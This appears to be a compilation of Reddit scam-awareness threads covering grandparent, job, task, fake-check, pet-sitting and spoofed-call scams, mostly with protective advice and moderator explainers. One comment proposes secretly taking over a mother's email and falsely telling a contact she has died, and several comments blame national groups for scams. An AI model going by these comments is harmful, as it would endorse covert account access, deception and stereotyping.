My friend's mom has also reconnected with an "old high school friend" who is giving her lots of advice about various and assorted things via email.  Recently my friend told me that her mom had never even talked about that guy (the old friend) until recent months.  Now she seems to confide everything in this person who lives far away.  I'm suspicious that might not be her old friend, but rather an imposter who might be targeting her in a pig-butchering scenario.
- 1st step
Delete their Facebook accounts
- Get a call screening box like Sentry.  You program it with known numbers and the rest go to VM or you have to enter a code.
- a friend was hit with the FB clone scam where "she" was supposedly stuck overseas and needed money for a hotel. She caught on and told all her family and friends, but said she still had a few elderly relatives who kept asking if she was sure she didn't need the money.
- Oh man, the 'hit the pregnant woman' thing might be my fault.  Last year I was getting a scammer calling who said he could help with the fact that I was involved in an accident and needed the details of the accident.  I thanked him and told him that I needed the help!   I said the accident was NOT my fault, I had to send a very important text message and my car jumped the curb and hit a woman pushing a baby carriage and IF SHE WAS NOT RIGHT IN THE MIDDLE OF THE SIDEWALK THE ACCIDENT WOULD NOT HAVE HAPPENED!   I got this scam call a few times.
- It's a good policy not to bail "kids" outta trouble in the first place.  Even if innocent, a night in jail while you can get your legal ducks in a row is far better than making a mistake which can be made even if this was legit.
- My parents and grandmothers would have not answered the phone or both grandmothers would have asked "Who the hell are you? Stop calling here!" and hung up.
- Teachable moment: "Mom and Dad, if you fall for this, you ARE NOT okay. You need help."
- As an elderly American (70 in 2 weeks), I'm glad this worked out. I worked in IT and system security for a long time, so I have the luxury of knowing how these clowns work. Despite this, I have chats with my wife (also nearly 70) about the dangers of things, just to keeps us alert and ready. 

It also breaks my heart to hear of people in my generation being targeted by these scumbags.

I agree with some of the other comments here about financial institutions needing to be more alert and proactive, too. I believe much of our everyday financial activity is done online. But when an older person walks into a bank to suddenly withdraw a large sum, talking with someone on a phone, an employee's radar should fire off, at least, the way it happened here. Sometimes, a friendly and gently-placed question or comment can reveal a lot, without being too "nosy" or intrusive.
- First of all no police will EVER call you about a "incident"

Scam scam scam....
- My cousin once told a scammer "AGAIN? I told him last time I wasn't going to bail him out anymore, he can rot in jail for all I care." and hung up.
- I had -the talk- with my mom recently.  One of the things I told her is that they are professionals and they are going to get to her emotions, and that she shouldn't be embarrassed if they do.  Call others and verify.
- It's second only to the "found your lost pet" scam.
- Brilliant!  You found the key to the tower!
- Part of the script is even "Johnny is really embarrassed about this so don't mention it to anyone."

OP: grandma is on a list now and she is going to get called again and again with a variety of different scams.  Change her land line number and cell number if you can.  And cudos to the bank for catching this. 

Some banks do have an "elderly monitoring" program where there is a trusted family member they will call for large transactions.
- And when that happens, there will likely be a whole subreddit of posts complaining "I was just trying to withdraw $17,000 in cash and the bank made me jump through a bunch of hoops just to get my own money!  Why is it there business what I do with my money?"
- There's a word for this: it's called civilization. Your taxes go to pay for law enforcement every day, whether or not the victims of crimes are stupid. Making banks more responsible will make them put better resources into training their staff, providing real services to clients (something that used to be normal, back when we could actually have a relationship with a banker), and putting better security protections in place. Right now banks do what they are mandated to do by law, and little more.
- I'm 65 and never answer my landline unless I know for certain who it is. I let all calls go to voicemail, and then check for msgs later. Scammers tend not to leave msgs.
- They don't need to AI anyone's voice. The scam works just fine as it is. Every single victim will swear that it was all real.
- That‚Äôs already happening.  I‚Äôve talked to multiple people that ‚Äúheard‚Äù a loved one on the phone.  In each case, they believed it but talked to the person separately and found out.

A good practice is to have a secret word that isn‚Äôt mentioned anywhere, but is known to family members.
- I'd frankly be blunt, and tell her that if she falls for all these scams, and believes everything she hears on phone or sees on the internet, she will likely lose all her money and her hard-won independence. Tell her the old high school friend is likely some guy in Zambia.
- If you're in the U.S., your local library might have a copy of Ancestry (dot) com and a lot of old high school yearbooks are on Ancestry.  Your friend might look up to see if there actually was someone by that name in her yearbook.
- We should all delete Facebook accounts.
- Really good idea. I didn't know this existed!
- How long did you keep stringing him along? The scammers that call me just won't take the bait.
- https://preview.redd.it/xsqlazstsmee1.jpeg?width=736&format=pjpg&auto=webp&s=b2e0984d7991e7a3bab162037e7cccba58dc6c5d
- Work for a bank in complaints (not US) I tell you that is one we get and customers hate it if a complaint is not upheld if the payment is genuine and is delayed in being sent  (banks need to be compliant with regulations to ensure accounts are safe even in that means sometimes a payment is stopped for verification to check it is genuine) or hate it if they (customers) have jumped through hoops and lied to say it is genuine only for it to turn out to be a scam (still the banks fault apparently) - there is no fail safe a bank can carry out to keep everyone happy
- Yep, and I'd rather pay higher bank fees for additional scam protections because the alternative is to pay higher taxes to provide basic necessities to scam victims who will rely on government assistance the rest of their lives.
- There's a lady on the clock app who has a landline that she doesn't even know the number, but the scammers do. She has a variety of ways to answer the phone to mess with them. 

Pretty sure it's one of those deals where you get a landline phone with a bundle of cable services, and she just lost the number they gave her.
- I don't answer my landline, either, unless I know who's calling.  My cell phone is set to Silent and each contact is assigned a ring.  The outgoing message on both phones is:  "Due to the high volume of scam calls, I'm forced to screen all calls.  Please leave a message if you're not a scammer."

I'm hoping that when I get dementia that "muscle memory" will kick in and I'll continue ignoring the ringing phone.
- She won't believe that. The daughter needs to get access to Mom"s email and block that guy. "Sadly Mom passed away last night." Then block but also continuously monitor.
- Be hard of hearing, but not too hard of hearing. Confused, but not too confused. "You called me yesterday? I have the apple gift cards right here." Then you need to locate reading glasses. Why are the gc numbers so small? Who is at the door? I am calling you to order metamucil for delivery.
- Not long, they hung up on me .
- They‚Äôre going to take his legs
- We have become a bit spoiled.  We expect to be fully protected by our institutions, but also in no way shape or form restricted by that protection.  We want to play with fire but get upset if we get burned.
- Fair. But governments also need to get up to speed - the scammers are so far ahead it's absurd. It's not just taxes; it's the cost of doing business for everyone, from the banks and the government to individual consumers.
- Not sure how much I trust someone who can't figure out to dial literally any other phone and have a friend look at the caller id.
- We want to fuck around, but we never want to find out.

- Getting past the "Why did you do that?" question:

- Lock down your credit.

- Sign up for credit report monitoring.  Monitor your credit religiously.  Even a free app like Credit Karma will alert you if an account is opened in your name.

- Contact your banks, credit card companies, all financial institutions with whom you do business and let them know what happened.

- Monitor ALL of your financial stuff: credit cards, bank accounts, you name it - monitor them daily for the next month or two.  Have your financial companies set up alert for your cell phone.  Enable 2FA immediately.

- Make UNIQUE never-before-used passwords for all of your accounts.  Now.  Change all of them.  Now.  Like, get off of Reddit right now and do that.  And enable 2FA (saying it again so that sinks in)

- This scam probably dates back to Ancient Sumer or Rome.
- !advancefee scam. Never send your own money to get money.
- Random people don't give you money, on or off the internet.

This is a very old scam, it's been around for a long time, way before internet or email or computers. Probably existed in ancient China 2500 years ago: I will give you a free goat. All you have to do is give me 20 zhu for transportation and taxes.

And people have been falling victim to this forever, which is why con artists keep trying it.

You never get the prize, the free money, or the free goat.
- Sounds like a really good way to get someone to send me $30.

Also this is a scam.
- Sigh.
- Everyone here is very familiar, she seems to go by different names all the time but it‚Äôs always the same scam
- I'll send you $20K for only a $40 clearance fee!  Seriously though it's a scam.
- Also, ask yourself: why in the name of all that is holy would a rando send YOU $10k? Are you that special?
- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Advance fee scam.

The [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam) arises from many different situations: investment opportunities, money transfers, job scams, online purchases of any type and any legality, etc., but the bottom line is always the same, you're expected to pay money to receive money. So you will pay the scammer and receive nothing.

It can be as simple as the scammer asking you to pay them upfront for an item they have listed, or as complex as a drug scam that involves an initial scam site, a scam shipping site, and fake government agents. Sometimes the scammers will simply take your first payment and dissappear, but sometimes they will take your initial payment and then make excuses that lead to you making additional payments.

If you are involved in an advance-fee scam, you should attempt to dispute/chargeback any payments sent to the scammer, you should block the scammer, and you should ignore them if they attempt to contact you again. Thanks to redditor AceyAceyAcey for this script.

- > Are you that special?

A lot of people will say yes (about themselves, of course), without hesitation. I blame movies.
- They are a bodybuilder, so they love themselves very very much.
- I'm amazed people treat the Internet as like their street and not an infinite global communications system. And in this infinite system you, specifically, have found the one person giving out money for nothing? 

LordüôÑ
- I blame internet influencers, and reality shows
- You mean, i‚Äôm *not* special? This is news to me.

Title: Is this a job scam??
Body: English is not my first language so the grammar will feel awkward, apologies in advance.

1- Searched the name of the administrator: didn‚Äôt come up. What I do know is that he is from a stock photo.
2- whenever I ask them on email how did they found my information , they ignore me. 
3- they do not have a phone number in their emails.
4- when searching for their head office I get a random result ( people from Canada or Manchester please verify)
5- the company‚Äôs name is not on any website. When I try to see or use any scam detection sites, nothing appears to be malicious. Which is what made me apprehensive about posting this because they did have my information (name, collage, GPA, number and email.) But it could be because they got leaked which is a whole other thing to be worried about.

Did anyone like me get an email from them?? I feel crazy for being paranoid, but I am not tech savvy and seeing them sending cover letters and pdf/ excel files made me confused.

- random uppercase words in sentence but then doesn't start sentence with uppercase  
"kindly"  
"tasks"  
"buy equipment"  
"admin"

.shop and .online websites

That's way to many red flags to my liking

  


!whois [gexco.online](http://gexco.online)
- Yes, it's a complete scam. 

"Dear Employee"? They don't even know who they're talking to? 

The font size changes throughout

Most importantly, nobody just emails you and tells you you have a job.
- yes 100% it's a scam. they're asking you to buy software for the job and submit it as an expense -- but it's not a real job and that expense will never get approved.

editing to say: if you visit the website linked, they want you to buy the software using crypto lmao. OP, run away from this, delete everything they sent you and stop responding.
- I‚Äôm sorry, but this is so funny to me. The *applicant* is the one who writes a cover letter, not the employer. And it‚Äôs terribly formatted and full of errors (I‚Äôll give you a pass on the second point since you admit you‚Äôre not a native speaker)
- In a world where there are free AI tools that can produce perfectly written business documents, these scammers are clearly aiming low by mailing out gibberish.
- Absolutely a scam‚Ä¶they use the word kindly. And everything else is grammatically wrong as well.
- Absolutely a scam.  Besides the other red flags noted, though supposedly a Canadian company with an English HR office, it is written in a stilted English, rife with awkward constructions, typos and grammatical errors, i.e. it was clearly drafted by uneducated non-English speakers.  Additionally, the link to get the software is clearly a scam site.  There is no detailed description of what this software supposedly does, there is no address or phone number for this "company," the only contact information is an email address to the site's domain, and it accepts payment in bitcoin.

Don't go any further with these scammers.

PS:  If you're sending out resumes, please spell "college" correctly. :)
- YES, it absolutely is either a !fakecheck scam or a !task scam. The biggest clues are the misspelled words (they wrote "now job" instead of "new job"), the random & inconsistent capitalization (some words that SHOULD be capitalized are not... like at the beginning of a sentence), and some that should NOT be capitalized are. But one of the biggest clues that this is a scam is the use of the word "kindly". We Americans... or pretty much ANY culture that is predominately English-speaking... do not use that word in everyday conversation. But for some reason the dumb scammers think that we do.
- ***What I do know is that he is from a stock photo***

I think you can stop there.
- One thousand percent a scam.
- We don't list addresses like that in Canada, it's close but not the correct format. Professional letters won't capitalize random words that shouldn't be capitalized, and miss the ones that should be. The author's first language isn't English.
- Global Multi Co? You can spot that scam from low earth orbit.
- The reverse search for the profile picture gives at least 6 results, here is one: https://shaynabergman.com/the-worst-boss-10-surefire-signs-youre-working-for-one-or-are-you-one/
- A global Canadian company that can't write a proper sentence with correct capitalization and punctuation? The random spacing on the text? Completely unprofessional looking.
- Yes fakejob and will lead to a !fakecheck scam
- Why do they keep using ‚Äúkindly‚Äù
- The Google Street View address for the Manchester address shows a mosque under construction, and the Canadian address is community housing for homeless men.
- The grammar is terrible and a lot of the wording follows typical scammer language.  Expect any online-only job posting or offer like this to be a scam.  Generally the head of a large, global company is not going to be reaching out to random new hires about specifics of a job like this.
- At no point does it ever seem legit at all.
- I was confident after the first sentence. The kindlys afterwards confirmed it, but that first sentence is them trying to instill confidence as to the ease of the job, but that you'll need to learn how to understand what's going on first. Nobody does that. Only scammers who have confusing non-jobs that they want you to stick around with, under a dream that it will make sense later.
- Does anyone have any insight on what language/cultural influences make certain people completely unable to grasp the proper use of case, spaces before punctuation, totally random punctuation, and other similar characteristics?

It is so bad, that no one could possibly think it is authentic.
- ‚ÄúKindly submit‚Äù‚Ä¶ it‚Äôs a scam. Scammers love the word ‚Äúkindly‚Äù. I‚Äôm not being funny they really do use it a lot.
- The grammar and syntax in that letter are hilarious.
- Read it out loud. It‚Äôs horribly written.
- Yes it's a scam. His whole text message is so silly.
- They don't make them any scammier than this.
- More red flags than a Chinese military parade...
- "What I do know is that he is from a stock photo"

so wtf is the question?
- Yes. And it's not even a good one. They really aren't trying that hard.
- Yes it‚Äôs a huge scam.
- Extensive use of "kindly", misuse of uppercase fonts in the "letter", it is a scam.
- Like, yes, of course??
- Kindly?

Buy software?
- Yes, it is a scam. Block and delete them.
- "Kindly"

/end
- Dude I glanced at the thumbnail and already knew it was a scam. You really can‚Äôt tell?
- Kindly.
- Does it say "kindly"?  YES? ------> It's a scam.
- Thank you all for your help! 
I have reported the emails, it genuinely freaked me out because my info got leaked. Can anyone tell me how to track back the person who leaked them? Or is there a possibility of such a thing?
- *SCAM!*
- Kindly.

Scam.
- I instantly saw the word kindly
- Scam.


Why would they use a stock photo for a profile pic...
- <cover letter>
- [deleted]
- Of course
- This is the third notification I've gotten about a post like this... and worded identically, with the same screenshots, with only the name of the company changed & the Redditor usernames being different. Am I going crazy?
- Delete
- I had a strange job interview over teams chat. The HR man immediately said he wanted to hire me. I told him I would need time to research the company and think about it. He said, yes of course go ahead and Reminisce the job offer. 
I knew for sure it was a scam after he said that.
- Absolutely a scam for multiple reasons:

* Salaried remote job
* Uses the word "Kindly"
* Advanced payment / check
* They tell you to buy something from a specific website

- Hi /u/Blonde_Dambition, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

- Hi /u/Blonde_Dambition, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- IKR?
- It's intentional. They aim for people who won't be suspicious of it and are less likely to figure out that it's a scam before they've paid up.
- Maybe they're doing the best they can, poor dears.

It must work with enough people that they don't need to change it. Sadly, many scam victims are so desperate, panicky, greedy, or gullible that they overlook lots of red flags.
- Scammers that don't speak English as their first language & who are uneducated, therefore being ignorant about spelling, capitalization, & punctuation I guess.
- It's generally good advice to read it out loud, but OP's not a native speaker of English. Grammar mistakes aren't as obvious in a second language
- It's pointless to try and find them. Even if you manage to figure out who they are, they will turn out to be somewhere in Nigeria where the local cops don't care one whit about the rampant scamming. They won't lift a finger to help you.

A better course of action would be to hang around this sub and inform yourself about the various employment scams out there. That should protect you against becoming another victim.
- I just want to commend you on your grammar & say that for English not being your first language, you "speak" it very well! üëç

Unfortunately you won't be able to find out how these people got your info & who they are. It's too prolific to trace. And with almost 100% certainty they're in India or Nigeria or some other country where scammers commonly live.
- You can try using haveibeenpwned(dot)com

It will tell you incidences of your email connected to leaks / data breaches 

However most of this stuff comes from marketing lists or if you expressed interest in a job posting on a site like Indeed that was actually fake, or have your contact info in LinkedIn or something similar.
- Nope, there have been massive data leaks

- Hi /u/LeBlubb, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

- Very common phrasing in UK
- It's a scam. Just block them.
- 100% scam.
- Scam. Block them but expect more since you replied. Just block them all. I'm so glad you came here to ask.
- Haha maybe so! I have actually caught myself almost using it too in professional communications! üòÅ
- I feel you! If I hadn't seen it used pretty much exclusively by scammers, I'd have thought it was a nice way to tell someone what needs to be done.
- There are also a lot of legitimate EU companies (not native english speaking) that use word kindly. My company works with 2 of those. While "kindly" can be 100% sign of scam in USA, here in Europe and probably in other places too, it is definitely a smaller red flag.

Title: How was an outgoing call added to my call log?
Body: I recently purchased a car from Honda. At some point, a number for a scammer was dialed from my phone that was very similar to Honda's. 

I called that number back, and ended up giving them a card number.

I've gotten the money back, but the question is:

How did I end up making the original outgoing call to the wrong number? It seems unlikely that an iPhone would be hacked, and I can't find the fake number anywhere in an email.

Also, aside from changing my passwords, what else should I do?

- Its highly unlikely it was added. Usually this is just the scammers buying up a bunch of phone numbers close to real companies and then you fat fingering when you dial.

No need to change passwords. Whenever you give up sensitive data you need to anything linked to that data. Nobody can get your password from a credit card number. Just cancel your credit card.
- Its not close enough. Dialing the number would almost be the equivalent of winning the lottery
- You yourself said that it was a number that was close to the number you intended to call.
- I looked again. I thought it was one number off, but it's 3

- Common sense is the key. Check that email address matches the official domain/website. Do not hesitate to call the company if you have been approached by a talent hunter. If there is a postal address, if possible visit the place or use Google map. Keep in mind that phone numbers can be spoofed, email from someone listed on LinkedIn doesn't always mean that this person really works for the company (fake LinkedIn profile).
- Also, is it a remote job?
- It depends how the context started? You applying to the company directly? From a job site like Indeed? Random texts?

You say you passed an interview - what kind? In person? Video? Phone? Text?

The context is important.
- I was contacted by recruiter via LinkedIn. Recruiter has verified account with on one previous employers. I had Zoom call interviews with hiring manager.

I am 90% confident that this is legit but I still would like to check. Are there any reliable tools for this type of verification?
- Can you check the official company site to see if they are hiring?
- Zoom video call? Invite from a legitimate email from a company domain?

There‚Äôs no ‚Äúplace‚Äù or ‚Äútools‚Äù to verify anything. Scammers spoof legitimate company names. 

The key again is the context. Scammers want text interviews with emails from Gmail account. Legitimate company want in person or video contacts with emails from company domains.

- No one is paying you to do anything simple that anyone can do. Whether it's liking posts, leaving fake reviews, clicking links, relabelling packages, data entry, etc. The lesson is to look for a real job, not to avoid this particular scam.
- !task. Names and locations are irrelevant - they're all fake. This stuff is based overseas.
- Yes, it is a task scam. Reported here every day.
Same script used by many other task scams.

Nobody really pays you for clicking a screen, no matter what they call it.

Real jobs pay you, you don't pay them. If a "job" tells you that you need to give them money, for whatever reason, they are trying to take your money -- this is not how jobs work.

So, you didn't have a job. The platform is fake, the tasks are fake, the people are all lying to you. The name of the "company" doesn't really matter, because there are hundreds of these phony jobs using different company names. But the scams all follow the same pattern:  You will be required to pay a fee to continue working or to withdraw your money. Then another fee, and another. Then they disappear with your money.

Most job offers for remote or work from home jobs are scams. There are so many job scams out there, they pretend to give you work like Data Entry, Data Optimization, posting reviews of hotels, or Virtual Personal Assistant, or "inspecting and re-shipping packages". But what the scams really do is take your money. **Some people have lost thousands to job scams. Some people have gone to prison for getting involved with illegal activities, like money laundering or parcel mule.**

If you're currently looking for a job, spend time here to get familiar with !job scams so you recognize the signs.

- Hi /u/Theba-Chiddero, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

Title: Visa/Mastercard Settlement Scam?
Body: I'm an attorney for a small business, and we are attempting to file a claim for a portion of the settlement that was reached in the Visa/Mastercard interchange fee case last year. When I went to file this claim for the business, another attorney in another state had already attempted to file on behalf of this business. I confirmed with the business owners that they have never spoken with anyone from this firm, and that there is no reason they should be on this claim. Is this a scam, or is this a legitimate tactic to obtain control over the settlement amount that we would receive?

I am very sure this is a scam because who would actually do this, also she replied to her own post like she was interested lol. I think I know what the scam would be, she would wait for you to pm her and then after a bit of back and forth she would offer for you to actually just buy the puppy off her for whatever amount, and of course there is actually no puppy. Is this correct, or does anyone have any other ideas about this? I‚Äôm honestly just really interested in how this would work, because I can‚Äôt imagine anyone actually going through with that, but of course there is always someone to fall for it somewhere.

- It's probably a variation of the fake check scam where they offer a large amount of money with you immediately flowing it back.  It will go something like this:

"I will mail you a check for $5000 to cover the 6 months of dog boarding, and by the way, because of the bank and all my house closing, I'll need you to send $1000 of of that money back (to my payment app address) after you deposit the check."

The check bounces a month later, but you've already given them $1000 through a non-refundable way.  The bank deducts the $5000 from your account and you're out the $1000 you already sent back.

You never see the dog.
- Maybe a !fakecheck scam if they insist you buy supplies or equipment first.

I do know someone who had to get her dog looked after by someone for 6 months as she was homeless and living in a motel. But it seems weird if this person is in the US.
- It sounds like more like a choosing beggar than a scam. Someone who wants 6 months of pet sitting for free.
- Well, I would be worried about someone bringing me a dog and then ghosting me, haha. 

But if you're willing to take a person's word that they'd take the dog back, and willing to believe them when they talk about paying you after the fact, and so completely trusting as to agree that you'd allow a stranger into your house regularly while you hold a dog for them, you're probably also willing to "front" some money for transportation or whatever and just get paid back when they pay you for dogsitting.

Which is never, of course.
- Some form of fees or money you'd have to pay to get the dog.

Also why would you baby sit a strangers dog, a puppy at that.
- could be   many angles here

the opening story feels wrong  but it  could be genuine 

could simply be they need someone to give free board  for  6 months while they go away maybe even doing prison time 



it could be   the pup is sick the owner cannot afford to  go to the vet   but if they give the pup to a stranger 

then the stranger finds out the pup is sick  they  have to take it to the vet  they may not even want the pup back  

you may never see them again 



another way would be in  5 months time they turn up and say  yeh I've come for the pup im  going to sell it 

you've grown attached to that pup  your a prime customer for it   it could even  be  a mongrel but are you not going to buy it  for  $500  after you've lived with it  for  6 months
- In an alternative world, there would be a wholesome version of this scam where you end up with the owner ghosts you and you now have a dog.
- I'd be worried the dog was stolen. Lol
- Every person that engages with the post will get a different PM based on what they say. Begging to help rehouse. Send money for gas/transport/dogfood/???. It‚Äôs actually a fairly efficient way to qualify targets.
- it is a common pet sitting scam. Scammer sends a fake/forged payment and asks you to buy pet supplies from their fake pet supplies website. The money you send is gone, and whatever they sent either never existed or gets taken back.
- OP, i wouldn‚Äôt do it.  Imagine they give you a sick dog, they ghost you, now you pay the vet bills.  They take the dog back and promise to pay you.   Then ghost you.

Im not saying this is what they‚Äôre going to do, but it could be a way for them to intentionally give you a sick dog so you pay the vet bill.   If you DON‚ÄôT take the dog to the vet they‚Äôll say you made the dog sick. 

Just another angle to look at.
- Fake dog scam.
Is nothing sacred?
- I know that American banks are required by law to make check balance available before validating the check and that's what this scam relies on but I don't know if other countries like Austuralia have similar law
- I didn‚Äôt think of it from this angle, definitely very possible. Sometimes I want to message the scammer and act dumb just to see how they work or where it is going haha
- Hi /u/SereniaKat, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- Definitely a scam, in the comments she replied ‚ÄúI‚Äôll PM you- What a beautiful lab‚Äù, not speaking to anyone else, as if she was trying to create more engagement on the post, to make it look like people were interested. There weren‚Äôt any photos attached to the post and not a single person had replied with a photo of their dog, so the beautiful lab comment was very weird
- It‚Äôs really a puppy St. Bernard, and will eat you out of house and home! /s

OP: are you in a place where English is the native language? I noticed the awkward word order. More natural would be ‚ÄúLabrador puppy‚Äù.

Subtle, but a small language clue. But of course would not be relevant. If the potential scammer mentioned they‚Äôre from another country or not a native speaker, etc.
- Very true, someone who is willing to open their home to a puppy so it gets a good life will definitely spend a lot of their own money to make sure it gets to them safely
- Exactly, all the comments were filled with people who didn‚Äôt know it was a scam suggesting she rehome said dog, as the dog would bond to them anyway, it‚Äôs just a weird situation that almost never would happen
- Oh god, I‚Äôd never do it, not even if there was a real puppy involved, just way too much that could happen. But I‚Äôm pretty certain that there isn‚Äôt even a real puppy, the poster had like 7 friends and said she lived in California where I live in a town in Australia, and she made a weird comment on the post replying that she‚Äôd PM herself, and acting like there was a photo attached which there definitely wasn‚Äôt haha
- yes i  fell for one and lost 1600 bucks because the bank said the check was ok after it set there for 3 days over the weekend,,,, later that monday it bounches=
- At the end of the day, the goal of the scammer is to get you to hand over money willingly. The fake check scam is the most obvious. It also could be the scam where they make you think you have money waiting, you just need to "upgrade" youR payment aop to the "business edition" and they give you a sign up link to a scam site.
- Yeah, the scammer called me saying I won the lottery because of something I filled out here  or there. I won millions of dollars, plus  a car, and more. They mentioned Publishers Clearing House. Then they said I would need to put forth $500 for the taxes for this prize. They would bring the prize to me, today, but I would need that 500 from a CVS or other place where I would have that on some money order type of thing. I told them no originally, they kept pushing. I decided to think about it, look into it and agreed for them to bring the prize the next day or I would call and cancel. I thought about it and called to cancel. She begged me not to and said she would have to give the money to charity if I didn't  agree to the $500 money order. I told her to give the money to charity. Wacky.
- That's probably also an angle, they'll reach out to anyone suggesting it to buy the dog.

It's more like a honeypot, seeing who bites how and scamming them based on their engagement.

Title: A strange coincidental scam call; phone company did not do much to reassure me. Weigh in?
Body: I talked to Bell support (legitimate) yesterday for a technical issue. It was resolved and I hung up. 20 minutes later, I received a call from a different number, with an unprofessional/average area code, with the title "Bell Mobility" on the screen. When I answered it, someone said they were calling from Bell. I assumed that it was an oversight because of my previous call to Support. I said "thanks, someone already called me from Bell", and went to hang up. He exclaimed "Yessss!" in what sounded to my ears as a 'knowing' way (kind of like 'jackpot!') before going into a sales pitch about how he was going to save me tons of money on my bill. I immediately hung up and contacted the real Bell number and told them about it.

They confirmed that it was a scam and noted the number. I tried to tell the representative that I had concerns about my personal information being leaked by Bell themselves due to the coincidental timing of the scam call, and the vibe that I got. He reassured me multiple times, he said something about how the scammers might be "experts" in finding out my info, but I am still concerned, can anyone shed light on this?

I feel like Bell would do anything they could to cover their a\*\*es if there was a leak, and how could the representative reassure me with such confidence that there aren't any bad actors at Bell selling people's personal info to these scammers?

- Hacking to gain real time access to telecom is really hard and expensive. It also attracts unwanted attention from law enforcement for a comparably low payout.

Calling random numbers in the known area codes of said telecom, on the other hand, is much, much easier and cheaper.

It's a coincidence. Don't be paranoid.
- >*Hacking to gain real time access to telecom*

>*known area codes of said telecom*

Could you please explain to me what you mean by "telecom" in this context? I don't know what this word means.
- "Scammers hacking" is, I believe, what the Bell representative themselves asserted, no? So how is that me being paranoid?
- Telecommunication company. Your phone provider.
- Thanks for clarifying, but like I said, it was the Bell rep themselves who seemed to suggest that these scammers are "experts in finding things out" one way or another, while I think that the scam call was more likely the product of my personal information being leaked from the inside.

Title: SmartCheapFares is a scam
